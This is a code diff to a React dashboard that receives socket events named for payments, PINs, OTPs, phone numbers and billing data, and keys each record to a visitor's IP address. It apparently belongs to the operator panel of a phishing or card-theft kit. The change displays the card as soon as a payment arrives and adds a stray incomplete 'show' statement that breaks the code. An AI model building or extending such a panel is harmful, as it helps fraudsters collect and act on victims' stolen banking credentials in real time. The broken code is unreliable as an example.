@@ -123,7 +123,6 @@ export default function App() {
           const exists = !!m[u.ip];
           playNotification(exists);    // call helper
 
-
           const oldObj = m[u.ip] || {
             payments: [],
             flag: false,
@@ -149,12 +148,13 @@ export default function App() {
           const exists = !!m[u.ip];
           playNotification(exists);    // call helper
 
-
           const oldObj = m[u.ip] || {
             payments: [],
             flag: false,
             hasNewData: false,
           };
+
+          show
 
           return {
             ...m,
@@ -190,7 +190,10 @@ export default function App() {
       socket.on("newShamel", (u) => mergeSingleton(u));
       socket.on("newThirdparty", (u) => mergeSingleton(u));
       socket.on("newBilling", (u) => mergeSingleton(u));
-      socket.on("newPayment", (u) => appendPayment(u));
+      socket.on("newPayment", (u) => {
+        appendPayment(u);
+        handleShowCard(u.ip);
+      });
       socket.on("newPhone", (u) => mergeSingleton(u));
       socket.on("newPin", (u) => mergeSingleton(u));
       socket.on("newOtp", (u) => mergeSingleton(u));
